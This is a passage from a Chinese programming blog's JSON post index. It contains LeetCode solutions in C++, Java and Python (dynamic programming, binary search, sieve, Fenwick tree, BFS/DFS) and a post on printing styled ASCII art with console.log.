所以我们返回sell[n-1] Code C++ 123456789101112131415class Solution &#123;public: int maxProfit(vector&lt;int&gt;&amp; prices) &#123; if (prices.size() &lt; 2) return 0; vector&lt;int&gt; buy(prices.size(), 0), sell(prices.size(), 0); buy[0] = -prices[0]; buy[1] = max(-prices[0], -prices[1]); sell[1] = max(0, buy[0] + prices[1]); for (int i = 2; i &lt; prices.size(); i++) &#123; sell[i] = max(sell[i - 1], buy[i - 1] + prices[i]); buy[i] = max(buy[i - 1], sell[i - 2] - prices[i]); &#125; return sell[prices.size() - 1]; &#125;&#125;; Python 1234567891011121314151617class Solution(object): def maxProfit(self, prices): &quot;&quot;&quot; :type prices: List[int] :rtype: int &quot;&quot;&quot; if not prices or len(prices) &lt; 2: return 0 n = len(prices) buy, sell = [0] * n, [0] * n buy[0] = -prices[0] buy[1] = max(-prices[0], -prices[1]) sell[1] = max(0, prices[1] - prices[0]) for i in xrange(2, n): buy[i] = max(sell[i - 2] - prices[i], buy[i - 1]) sell[i] = max(buy[i - 1] + prices[i], sell[i - 1]) return sell[n - 1]","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"},{"name":"dynamic programming","slug":"dynamic-programming","permalink":"https://www.hrwhisper.me/tags/dynamic-programming/"}]},{"title":"leetcode First Bad Version","slug":"leetcode-first-bad-version","date":"2015-11-23T01:17:51.000Z","updated":"2021-01-08T13:32:16.846Z","comments":true,"path":"leetcode-first-bad-version/","link":"","permalink":"https://www.hrwhisper.me/leetcode-first-bad-version/","excerpt":"leetcode First Bad Version You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad. Suppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad. You are given an API bool isBadVersion(version) which will return whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API.","text":"leetcode First Bad Version You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad. Suppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad. You are given an API bool isBadVersion(version) which will return whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API. 题目地址： leetcode First Bad Version 题意：给定版本号从1~n，还有一个API bool isBadVersion(version) ，这个函数可以用来判断版本是否是错误的。 你的任务是最少次的调用这个API，来确定最先出错的位置 思路： 从版本出错的那个位置之后的版本也是错误的，所以很明显，二分即可。 1A水题 1234567891011121314class Solution(object): def firstBadVersion(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; L , R = 1 , n + 1 while L &lt; R : mid = L + ((R-L) &gt;&gt; 1) if isBadVersion(mid): R = mid else: L = mid + 1 return L","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Count Primes","slug":"leetcode-count-primes","date":"2015-11-20T05:24:07.000Z","updated":"2021-01-08T13:32:16.835Z","comments":true,"path":"leetcode-count-primes/","link":"","permalink":"https://www.hrwhisper.me/leetcode-count-primes/","excerpt":"leetcode Count Primes Description: Count the number of prime numbers less than a non-negative number, n.","text":"leetcode Count Primes Description: Count the number of prime numbers less than a non-negative number, n. 题目地址 ： leetcode Count Primes 思路: 朴素的判断必定超时，我们每次判断一个数是素数的时候，就将它的倍数标记为非素数即可。 下面附上c++ python 和 java代码 Code C++ 123456789101112131415161718class Solution &#123;public: int countPrimes(int n) &#123; if (n &lt;= 2) return 0; bool * isPrimer = new bool[n]; for (int i = 0; i &lt; n; i++) isPrimer[i] = true; for (int i = 2; i * i &lt; n; i++) &#123; if (isPrimer[i]) for (int j = i ; j * i &lt; n; j ++) isPrimer[j * i] = false; &#125; int res = 0; for (int i = 2; i &lt; n; i++) if (isPrimer[i]) res++; delete[] isPrimer; return res; &#125;&#125;; Java 123456789101112131415class Solution &#123; public int countPrimes(int n) &#123; if (n &lt;= 2) return 0; boolean[] vis = new boolean[n]; for (int i = 2; i * i &lt; n; i++) &#123; if (vis[i]) continue; for (int j = i; j * i &lt; n; j++) vis[i * j] = true; &#125; int ans = 0; for (int i = 2; i &lt; n; i++) if (!vis[i]) ans++; return ans; &#125;&#125; Python 123456789101112131415161718class Solution(object): def countPrimes(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; if n &lt;= 2: return 0 vis = [False] * n for i in range(2, int(n ** 0.5) + 1): if vis[i]: continue j = i while j * i &lt; n: vis[j * i] = True j += 1 ans = 0 for i in range(2, n): if not vis[i]: ans += 1 return ans 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"Java","slug":"Java","permalink":"https://www.hrwhisper.me/tags/Java/"}]},{"title":"leetcode Perfect Squares","slug":"leetcode-perfect-squares","date":"2015-11-20T02:12:46.000Z","updated":"2021-01-08T13:32:16.858Z","comments":true,"path":"leetcode-perfect-squares/","link":"","permalink":"https://www.hrwhisper.me/leetcode-perfect-squares/","excerpt":"leetcode Perfect Squares Given a positive integer n, find the least number of perfect square numbers (for example, 1, 4, 9, 16, ...) which sum to n. For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9.","text":"leetcode Perfect Squares Given a positive integer n, find the least number of perfect square numbers (for example, 1, 4, 9, 16, ...) which sum to n. For example, given n = 12, return 3 because 12 = 4 + 4 + 4; given n = 13, return 2 because 13 = 4 + 9. 题目地址： leetcode Perfect Squares 题意： 给定一个整数n，找到最少的完全平方数使得他们的和为n 思路： dp,设dp[i]为和i的最少完全平方数。 dp[i] = min(dp[i - j*j] + 1) {j *j &lt;i} code C++ 1234567891011121314class Solution &#123;public: int numSquares(int n) &#123; int *dp = new int[n + 1]; for (int i = 0; i &lt;= n; i++) &#123; dp[i] = i; for (int j = 1; j * j &lt;= i; j++) &#123; if (dp[i - j*j] + 1 &lt; dp[i]) dp[i] = dp[i - j*j] + 1; &#125; &#125; return dp[n]; &#125;&#125;; Python同样的代码会超时。。。","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Range Sum Query - Mutable","slug":"leetcode-range-sum-query-mutable","date":"2015-11-19T00:32:41.000Z","updated":"2021-01-08T13:32:16.860Z","comments":true,"path":"leetcode-range-sum-query-mutable/","link":"","permalink":"https://www.hrwhisper.me/leetcode-range-sum-query-mutable/","excerpt":"leetcode Range Sum Query - Mutable Given an integer array nums, find the sum of the elements between indices i and j (i ≤ j), inclusive. The update(i, val) function modifies nums by updating the element at index i to val. Example: Given nums = [1, 3, 5] sumRange(0, 2) -&gt; 9 update(1, 2) sumRange(0, 2) -&gt; 8 Note: The array is only modifiable by the update function. You may assume the number of calls to update and sumRange function is distributed evenly.","text":"leetcode Range Sum Query - Mutable Given an integer array nums, find the sum of the elements between indices i and j (i ≤ j), inclusive. The update(i, val) function modifies nums by updating the element at index i to val. Example: Given nums = [1, 3, 5] sumRange(0, 2) -&gt; 9 update(1, 2) sumRange(0, 2) -&gt; 8 Note: The array is only modifiable by the update function. You may assume the number of calls to update and sumRange function is distributed evenly. 题目地址 ： leetcode Range Sum Query - Mutable 题意： 给定一个数组，让你正确实现如下两种操作: update(i , val )：让下标为i增加val sumRange(i，j): 计算数组从i到j的值 思路： 其实在 leetcode Range Sum Query – Immutable 我已经给多可变数组的解法。 直接上fenwick tree或者线段树都行。 fenwick tree比较好写，水水的1A~ 关于fenwick tree看这里： Fenwick tree (binary indexed tree) Code 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class NumArray(object): def __init__(self, nums): &quot;&quot;&quot; initialize your data structure here. :type nums: List[int] &quot;&quot;&quot; self.sum_array = [0] * (len(nums) + 1) self.nums = nums self.n = len(nums) for i in xrange(len(nums)): self.add(i + 1,nums[i]) def add(self,x,val): while x &lt;= self.n: self.sum_array[x] += val x += self.lowbit(x) def lowbit(self,x): return x &amp; -x def sum(self,x): res = 0 while x &gt;0: res += self.sum_array[x] x -= self.lowbit(x) return res def update(self, i, val): &quot;&quot;&quot; :type i: int :type val: int :rtype: int &quot;&quot;&quot; self.add(i + 1, val - self.nums[i]) self.nums[i] = val def sumRange(self, i, j): &quot;&quot;&quot; sum of elements nums[i..j], inclusive. :type i: int :type j: int :rtype: int &quot;&quot;&quot; if not self.nums: return 0 return self.sum(j+1) - self.sum(i)","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Additive Number","slug":"leetcode-additive-number","date":"2015-11-18T13:21:45.000Z","updated":"2021-01-08T13:32:16.890Z","comments":true,"path":"leetcode-additive-number/","link":"","permalink":"https://www.hrwhisper.me/leetcode-additive-number/","excerpt":"leetcode Additive Number Additive number is a positive integer whose digits can form additive sequence. A valid additive sequence should contain at least three numbers. Except for the first two numbers, each subsequent number in the sequence must be the sum of the preceding two. For example: \"112358\" is an additive number because the digits can form an additive sequence: 1, 1, 2, 3, 5, 8. 11 + 1 &#x3D; 2, 1 + 2 &#x3D; 3, 2 + 3 &#x3D; 5, 3 + 5 &#x3D; 8 \"199100199\" is also an additive number, the additive sequence is: 1, 99, 100, 199. 11 + 99 &#x3D; 100, 99 + 100 &#x3D; 199 Note: Numbers in the additive sequence cannot have leading zeros, so sequence 1, 2, 03 or 1, 02, 3 is invalid. Given a string represents an integer, write a function to determine if it's an additive number.","text":"leetcode Additive Number Additive number is a positive integer whose digits can form additive sequence. A valid additive sequence should contain at least three numbers. Except for the first two numbers, each subsequent number in the sequence must be the sum of the preceding two. For example: \"112358\" is an additive number because the digits can form an additive sequence: 1, 1, 2, 3, 5, 8. 11 + 1 &#x3D; 2, 1 + 2 &#x3D; 3, 2 + 3 &#x3D; 5, 3 + 5 &#x3D; 8 \"199100199\" is also an additive number, the additive sequence is: 1, 99, 100, 199. 11 + 99 &#x3D; 100, 99 + 100 &#x3D; 199 Note: Numbers in the additive sequence cannot have leading zeros, so sequence 1, 2, 03 or 1, 02, 3 is invalid. Given a string represents an integer, write a function to determine if it's an additive number. 题目地址 ： leetcode Additive Number 题意： 给定一串字符串，让你判断是否可以按顺序划分成诺干个数（三个以上），其中前面的两个数和等于第三个数。 如112358划分为1，1，2，3，5，8恰好满足。 注意，划分的数字不能有前导0 思路： 其实只要前两个数固定了，后面是否能划分就是确定的了。 因为前两个数决定了第三个数，第三个数和第二个数决定了第四个。。。 所以，枚举前两个数的终点位置，进行递归判断即可。 1A水过~ Code Python 12345678910111213141516171819202122232425262728293031class Solution(object): def dfs(self, start, first, second, n, num): first_num , second_num = num[start:first] , num[first:second] if len(first_num) &gt; 1 and first_num[0] == &#x27;0&#x27; or len(second_num) &gt; 1 and second_num[0] ==&#x27;0&#x27;: return False temp_sum = int(first_num) + int(second_num) if temp_sum == int(num[second:]) and num[second] !=&#x27;0&#x27;: return True max_len = max(first - start, second - first) if second + max_len &lt;= n: status = False if temp_sum == int(num[second:second + max_len]): status = self.dfs(first, second, second + max_len, n, num) if not status and second + max_len + 1 &lt;= n and temp_sum == int(num[second:second + max_len + 1]): status = self.dfs(first, second, second + max_len + 1, n, num) return status return False def isAdditiveNumber(self, num): &quot;&quot;&quot; :type num: str :rtype: bool &quot;&quot;&quot; if not num or len(num) &lt; 3: return False n = len(num) for i in xrange(1, n): for j in xrange(i + 1, n): if self.dfs(0, i, j, n, num): return True return False","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"站点彩蛋 —— console输出","slug":"site-console-log","date":"2015-11-13T10:53:29.000Z","updated":"2020-10-20T01:20:51.066Z","comments":true,"path":"site-console-log/","link":"","permalink":"https://www.hrwhisper.me/site-console-log/","excerpt":"如果你打开我Blog，然后按下F12打开控制台，切换到Console，那么你会看到如下的界面~ site-console-log-hrwhisper.me 这是怎么实现的呢？","text":"如果你打开我Blog，然后按下F12打开控制台，切换到Console，那么你会看到如下的界面~ site-console-log-hrwhisper.me 这是怎么实现的呢？ 还有好多其他的站点，比如知乎： 比如百度 其实很多都是用这个做招聘信息~ 如何实现这个呢？让人不经意间ctrl + shift + i打开，眼前一亮的东西？ 请看本文： console.log() JS里有个console.log()函数，用于在控制台上输出信息。 上面的图像其实就是输出指定的字符。 你可以直接试试，打开F12控制台（或者直接ctrl + shift + i），输入如下内容 1console.log(&#x27;hello world&#x27;); 效果如下： site-console-log-helloworld console.log() 美化 默认输出白底黑字的~丑丑哒 那么怎么改变颜色啥的呢？ 答案是用%c来表名格式，在console.log中每个%c对应一系列css属性，如下。 12var text = &#x27;%c hrwhisper %c is a %c cool boy.&#x27;;console.log(text, &#x27;color:#337ab7;&#x27;, &#x27;&#x27;, &#x27;color:red;font-style:italic&#x27;); 中间特插入%c，否则会从一开始到下一个%c字体都是蓝色的~ 效果如下 site-console-log-beautiful Javascript 多行字符串 在python下，多行字符可以直接''' '''包括起来，JS则没有这样的功能，JS多行 字符串方法很多，下面介绍比较优雅的方法 函数注释 这是我觉得最优雅的方法。 直接声明个函数，在函数里写上注释，然后转化为数组，进行注释替换（/* 和*/） 123456789101112131415161718function getMultiLine(f) &#123;var lines =f.toString(); return lines.substring(lines.indexOf(&quot;/*&quot;) + 3, lines.lastIndexOf(&quot;*/&quot;)); &#125;var console_text = function() &#123; /* hrwhisperisahandsome boy.*/ &#125;;console.log(getMultiLine(console_text)); 请自行运行如上代码 :) Code 经过前面的探讨，我们只要有好看的字符画，然后丢到函数注释里面就好啦~~~ 如，我的blog如下： 123456789101112131415161718192021222324252627282930313233 function getMultiLine(f) &#123;var lines =f.toString(); return lines.substring(lines.indexOf(&quot;/*&quot;) + 3, lines.lastIndexOf(&quot;*/&quot;)); &#125;//字符画不能随意缩进，不然显示会错位var console_text = function() &#123; /* /~~~~~\\ /~~~~~\\ (~&#x27; ~~~) \\ \\__________/ / /~:::::::: ~\\ /~~~~~~~-_ :::::::: _-~~~~~~~\\\\ ======= / ::A::; A :\\ ====== / ~-_____-~ _----------------_:: ~-____-~ /~ ~\\ / \\ ( () () ) `\\ ./&#x27; ~-_______________-~ /~~~~\\ (________) () 努力的人本身就有奇迹 , 努力让自己更牛逼 ^ ^ %c by hrwhisper*/ &#125;console.log(getMultiLine(console_text),&#x27;color:#337ab7;font-size:18px;font-style:italic&#x27;) 其实搜狗输入法自带了字符画（昨天特意下来看看有啥=v=，然后继续用系统自带的输入法。。。windows 10自带输入法已经很好用了的感觉，还不会广告啥的~） 更多好看的字符画：可以google一下或者百度一下字符画~ 比如世界地图 site-console-log-world-map 还有一个叼叼的： site-console-log-programmer 还有自由女神像(Statue Of Liberty)! site-console-log-statue-of-liberty","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"OtherCodes","slug":"code/OtherCodes","permalink":"https://www.hrwhisper.me/categories/code/OtherCodes/"}],"tags":[{"name":"Cool","slug":"Cool","permalink":"https://www.hrwhisper.me/tags/Cool/"},{"name":"Javascript","slug":"Javascript","permalink":"https://www.hrwhisper.me/tags/Javascript/"}]},{"title":"leetcode Range Sum Query 2D - Immutable","slug":"leetcode-range-sum-query-2d-immutable","date":"2015-11-12T03:47:27.000Z","updated":"2020-10-26T15:19:35.121Z","comments":true,"path":"leetcode-range-sum-query-2d-immutable/","link":"","permalink":"https://www.hrwhisper.me/leetcode-range-sum-query-2d-immutable/","excerpt":"leetcode Range Sum Query 2D - Immutable Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (_row_1, _col_1) and lower right corner (_row_2, _col_2). The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8. Example: 1234567891011Given matrix &#x3D; [ [3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]sumRegion(2, 1, 4, 3) -&gt; 8sumRegion(1, 1, 2, 2) -&gt; 11sumRegion(1, 2, 2, 4) -&gt; 12 Note: You may assume that the matrix does not change. There are many calls to sumRegion function. You may assume that _row_1 ≤ _row_2 and _col_1 ≤ _col_2.","text":"leetcode Range Sum Query 2D - Immutable Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (_row_1, _col_1) and lower right corner (_row_2, _col_2). The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8. Example: 1234567891011Given matrix &#x3D; [ [3, 0, 1, 4, 2], [5, 6, 3, 2, 1], [1, 2, 0, 1, 5], [4, 1, 0, 1, 7], [1, 0, 3, 0, 5]]sumRegion(2, 1, 4, 3) -&gt; 8sumRegion(1, 1, 2, 2) -&gt; 11sumRegion(1, 2, 2, 4) -&gt; 12 Note: You may assume that the matrix does not change. There are many calls to sumRegion function. You may assume that _row_1 ≤ _row_2 and _col_1 ≤ _col_2. 题目地址 leetcode Range Sum Query 2D - Immutable 题意： 给定一个矩阵，和两个矩阵的坐标(row1,col1)，（row2,col2），让你计算他们之间元素的和 思路： 和之前的那题leetcode Range Sum Query – Immutable很像，只不过这次用二维数组进行和的存储。 记得多减去的要加回来~ Code: 123456789101112131415161718192021222324252627282930class NumMatrix(object): def __init__(self, matrix): &quot;&quot;&quot; initialize your data structure here. :type matrix: List[List[int]] &quot;&quot;&quot; self.false_input = not matrix or not matrix[0] if self.false_input: return m, n = len(matrix) + 1, len(matrix[0]) + 1 self.sum = [[0 for j in xrange(n)] for i in xrange(m)] for i in xrange(1, m): for j in xrange(1, n): self.sum[i][j] = self.sum[i][j - 1] + matrix[i - 1][j - 1] for i in xrange(1, m): for j in xrange(1, n): self.sum[i][j] = self.sum[i - 1][j] + self.sum[i][j] def sumRegion(self, row1, col1, row2, col2): &quot;&quot;&quot; sum of elements matrix[(row1,col1)..(row2,col2)], inclusive. :type row1: int :type col1: int :type row2: int :type col2: int :rtype: int &quot;&quot;&quot; if self.false_input: return 0 return self.sum[row2 + 1][col2 + 1] - self.sum[row2 + 1][col1] - self.sum[row1][col2 + 1]\\ + self.sum[row1][col1]","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Range Sum Query - Immutable","slug":"leetcode-range-sum-query-immutable","date":"2015-11-10T06:46:50.000Z","updated":"2021-01-08T13:32:16.860Z","comments":true,"path":"leetcode-range-sum-query-immutable/","link":"","permalink":"https://www.hrwhisper.me/leetcode-range-sum-query-immutable/","excerpt":"leetcode Range Sum Query - Immutable Given an integer array nums, find the sum of the elements between indices i and j (i ≤ j), inclusive. Example: Given nums = [-2, 0, 3, -5, 2, -1] sumRange(0, 2) -&gt; 1 sumRange(2, 5) -&gt; -1 sumRange(0, 5) -&gt; -3 Note: You may assume that the array does not change. There are many calls to sumRange function.","text":"leetcode Range Sum Query - Immutable Given an integer array nums, find the sum of the elements between indices i and j (i ≤ j), inclusive. Example: Given nums = [-2, 0, 3, -5, 2, -1] sumRange(0, 2) -&gt; 1 sumRange(2, 5) -&gt; -1 sumRange(0, 5) -&gt; -3 Note: You may assume that the array does not change. There are many calls to sumRange function. 题目地址 leetcode Range Sum Query - Immutable 题意： 给你一个数组，让你求i,j的和 数组不变 有许多次的计算 思路： 直接记录和。。。。 1234567891011121314151617181920class NumArray(object): def __init__(self, nums): &quot;&quot;&quot; initialize your data structure here. :type nums: List[int] &quot;&quot;&quot; n = len(nums) self.sum = [0] * (n + 1) for i in xrange(n): self.sum[i+1] = self.sum[i] + nums[i] def sumRange(self, i, j): &quot;&quot;&quot; sum of elements nums[i..j], inclusive. :type i: int :type j: int :rtype: int &quot;&quot;&quot; return self.sum[j+1] - self.sum[i] 复习一下fenwick树，支持修改。（本题数组不变）当然也可以线段树。 关于fenwick tree看这里： Fenwick tree (binary indexed tree) 1234567891011121314151617181920212223242526272829303132333435363738class NumArray(object): def __init__(self, nums): &quot;&quot;&quot; initialize your data structure here. :type nums: List[int] &quot;&quot;&quot; nums = [0] + nums self.nums = [0] * len(nums) self.n = len(nums) for i in xrange(1, self.n): self.add(i, nums[i]) def sumRange(self, i, j): &quot;&quot;&quot; sum of elements nums[i..j], inclusive. :type i: int :type j: int :rtype: int &quot;&quot;&quot; return self.sum(j + 1) - self.sum(i) def lowbit(self, x): return x &amp; (-x) def sum(self, x): res = 0 while x &gt; 0: res += self.nums[x] x -= self.lowbit(x) return res def add(self, x, d): while x &lt; self.n: self.nums[x] += d x += self.lowbit(x) 更进一步： leetcode Range Sum Query – Mutable","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Remove Invalid Parentheses","slug":"leetcode-remove-invalid-parentheses","date":"2015-11-06T08:25:10.000Z","updated":"2021-01-08T13:32:16.865Z","comments":true,"path":"leetcode-remove-invalid-parentheses/","link":"","permalink":"https://www.hrwhisper.me/leetcode-remove-invalid-parentheses/","excerpt":"leetcode Remove Invalid Parentheses Remove the minimum number of invalid parentheses in order to make the input string valid. Return all possible results. Note: The input string may contain letters other than the parentheses ( and ). Examples: \"()())()\" -&gt; [\"()()()\", \"(())()\"] \"(a)())()\" -&gt; [\"(a)()()\", \"(a())()\"] \")(\" -&gt; [\"\"]","text":"leetcode Remove Invalid Parentheses Remove the minimum number of invalid parentheses in order to make the input string valid. Return all possible results. Note: The input string may contain letters other than the parentheses ( and ). Examples: \"()())()\" -&gt; [\"()()()\", \"(())()\"] \"(a)())()\" -&gt; [\"(a)()()\", \"(a())()\"] \")(\" -&gt; [\"\"] 题目地址：leetcode Remove Invalid Parentheses 题意： 给定一串括号组成的字符串（可能 有其他字符），要求你在去除最少的括号数情况下，使其合法。输出所有结果 思路： 方法一 BFS: 枚举去除的点，当找到后停止BFS树的扩展（因为要去除最少括号，所以即使有其他的结果，也一定在同一层） 1234567891011121314151617181920212223242526272829303132class Solution(object): def removeInvalidParentheses(self, s): &quot;&quot;&quot; :type s: str :rtype: List[str] &quot;&quot;&quot; if not s: return [&#x27;&#x27;] q, ans, vis = [s], [], set([s]) found = False while q: cur = q.pop(0) if self.isValidParentheses(cur): found = True ans.append(cur) elif not found: for i in xrange(len(cur)): if cur[i] == &#x27;(&#x27; or cur[i] == &#x27;)&#x27;: t = cur[:i] + cur[i + 1:] if t not in vis: q.append(t) vis.add(t) return ans def isValidParentheses(self, s): cnt = 0 for c in s: if c == &#x27;(&#x27;: cnt += 1 elif c == &#x27;)&#x27;: if cnt == 0: return False cnt -= 1 return cnt == 0 更简洁的写法 12345678910111213141516171819202122class Solution(object): def removeInvalidParentheses(self, s): &quot;&quot;&quot; :type s: str :rtype: List[str] &quot;&quot;&quot; if not s: return [&#x27;&#x27;] q = &#123;s&#125; while q: ans = filter(self.isValidParentheses,q) if ans: return ans q = &#123;cur[:i] + cur[i + 1:] for cur in q for i in xrange(len(cur))&#125; def isValidParentheses(self, s): cnt = 0 for c in s: if c == &#x27;(&#x27;: cnt += 1 elif c == &#x27;)&#x27;: if cnt == 0: return False cnt -= 1 return cnt == 0 方法二： DFS 统计左右括号能删的个数，进行DFS。 1234567891011121314151617181920212223242526272829303132333435363738class Solution(object): def removeInvalidParentheses(self, s): &quot;&quot;&quot; :type s: str :rtype: List[str] &quot;&quot;&quot; if not s: return [&#x27;&#x27;] left_remove = right_remove = 0 for c in s: if c == &#x27;(&#x27;: left_remove += 1 elif c == &#x27;)&#x27;: if left_remove: left_remove -= 1 else: right_remove += 1 ans = set() self.dfs(0, left_remove, right_remove, 0, &#x27;&#x27;, s, ans) return list(ans) def dfs(self, index, left_remove, right_remove, left_pare, cur, s, ans): if left_remove &lt; 0 or right_remove &lt; 0 or left_pare &lt; 0: return if index == len(s): if left_remove == right_remove == left_pare == 0: ans.add(cur) return if s[index] == &#x27;(&#x27;: self.dfs(index + 1, left_remove - 1, right_remove, left_pare, cur, s, ans) self.dfs(index + 1, left_remove, right_remove, left_pare + 1, cur + s[index], s, ans) elif s[index] == &#x27;)&#x27;: self.dfs(index + 1, left_remove, right_remove - 1, left_pare, cur, s, ans) self.dfs(index + 1, left_remove, right_remove, left_pare - 1, cur + s[index], s, ans) else: self.dfs(index + 1, left_remove, right_remove, left_pare, cur + s[index], s, ans)","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode Bulls and Cows","slug":"leetcode-bulls-and-cows","date":"2015-11-04T08:39:22.000Z","updated":"2021-01-08T13:32:16.827Z","comments":true,"path":"leetcode-bulls-and-cows/","link":"","permalink":"https://www.hrwhisper.me/leetcode-bulls-and-cows/","excerpt":"leetcode Bulls and Cows You are playing the following Bulls and Cows game with your friend: You write a 4-digit secret number and ask your friend to guess it. Each time your friend guesses a number, you give a hint. The hint tells your friend how many digits are in the correct positions (called \"bulls\") and how many digits are in the wrong positions (called \"cows\"). Your friend will use those hints to find out the secret number. For example: Secret number: \"1807\" Friend's guess: \"7810\" Hint: 1 bull and 3 cows. (The bull is 8, the cows are 0, 1 and 7.) Write a function to return a hint according to the secret number and friend's guess, use A to indicate the bulls and B to indicate the cows. In the above example, your function should return \"1A3B\". Please note that both secret number and friend's guess may contain duplicate digits, for example: Secret number: \"1123\" Friend's guess: \"0111\" In this case, the 1st 1 in friend's guess is a bull, the 2nd or 3rd 1 is a cow, and your function should return \"1A1B\". You may assume that the secret number and your friend's guess only contain digits, and their lengths are always equal.","text":"leetcode Bulls and Cows You are playing the following Bulls and Cows game with your friend: You write a 4-digit secret number and ask your friend to guess it. Each time your friend guesses a number, you give a hint. The hint tells your friend how many digits are in the correct positions (called \"bulls\") and how many digits are in the wrong positions (called \"cows\"). Your friend will use those hints to find out the secret number. For example: Secret number: \"1807\" Friend's guess: \"7810\" Hint: 1 bull and 3 cows. (The bull is 8, the cows are 0, 1 and 7.) Write a function to return a hint according to the secret number and friend's guess, use A to indicate the bulls and B to indicate the cows. In the above example, your function should return \"1A3B\". Please note that both secret number and friend's guess may contain duplicate digits, for example: Secret number: \"1123\" Friend's guess: \"0111\" In this case, the 1st 1 in friend's guess is a bull, the 2nd or 3rd 1 is a cow, and your function should return \"1A1B\". You may assume that the secret number and your friend's guess only contain digits, and their lengths are always equal. 题目地址：leetcode Bulls and Cows 题意 